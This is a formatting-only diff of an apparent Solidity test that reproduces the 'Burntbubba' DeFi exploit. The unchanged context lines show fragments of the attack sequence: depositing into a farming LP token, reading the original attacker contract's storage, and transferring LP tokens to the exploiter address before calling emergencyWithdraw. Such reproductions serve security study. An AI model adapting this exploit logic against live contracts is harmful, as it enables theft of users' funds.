@@ -34,17 +34,23 @@ interface IFarmingLPToken {
 
     function transfer(address to, uint256 amount) external returns (bool);
 
-    function emergencyWithdraw(address beneficiary) external;
+    function emergencyWithdraw(
+        address beneficiary
+    ) external;
 
     function withdrawableTotalLPs() external view returns (uint256);
 
     function totalShares() external view returns (uint256);
 
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
 }
 
 interface ISushiUSDC is IUSDC {
-    function burn(address to) external returns (uint256 amount0, uint256 amount1);
+    function burn(
+        address to
+    ) external returns (uint256 amount0, uint256 amount1);
 }
 
 contract BurntbubbaExploit is BaseTestWithBalanceLog {
@@ -127,19 +133,14 @@ contract BurntbubbaExploit is BaseTestWithBalanceLog {
         path1[0] = address(WETH);
         path1[1] = address(SUSHI);
         FarmingLPToken.deposit(
-            SushiUSDC.balanceOf(address(this)),
-            path0,
-            path1,
-            0,
-            address(this),
-            block.timestamp + 1_000
+            SushiUSDC.balanceOf(address(this)), path0, path1, 0, address(this), block.timestamp + 1000
         );
         // Pull out value from original attack contract storage. Needed it for transfer amount calculation
         uint256 value = uint256(vm.load(originalAttackContract, bytes32(uint256(10))));
         uint256 totalWithdrawableLPs = FarmingLPToken.withdrawableTotalLPs();
         uint256 totalShares = FarmingLPToken.totalShares();
-        uint256 transferAmount = FarmingLPToken.balanceOf(address(this)) -
-            ((value * totalShares) / totalWithdrawableLPs);
+        uint256 transferAmount =
+            FarmingLPToken.balanceOf(address(this)) - ((value * totalShares) / totalWithdrawableLPs);
         // In the attack tx amount of LPToken was transfered to exploiter eoa addr before making call to
         // 'emergencyWithdraw'
         FarmingLPToken.transfer(toAddr, transferAmount);
@@ -153,7 +154,7 @@ contract BurntbubbaExploit is BaseTestWithBalanceLog {
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(SUSHI);
-        SushiRouter.swapTokensForExactTokens(amountOut, 200e15, path, address(this), block.timestamp + 1_000);
+        SushiRouter.swapTokensForExactTokens(amountOut, 200e15, path, address(this), block.timestamp + 1000);
         SUSHI.transfer(address(SushiSwap), amount + feeAmount);
     }
 
@@ -167,14 +168,7 @@ contract BurntbubbaExploit is BaseTestWithBalanceLog {
 
     function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired) private {
         SushiRouter.addLiquidity(
-            tokenA,
-            tokenB,
-            amountADesired,
-            amountBDesired,
-            0,
-            0,
-            address(this),
-            block.timestamp + 1_000
+            tokenA, tokenB, amountADesired, amountBDesired, 0, 0, address(this), block.timestamp + 1000
         );
     }
 }
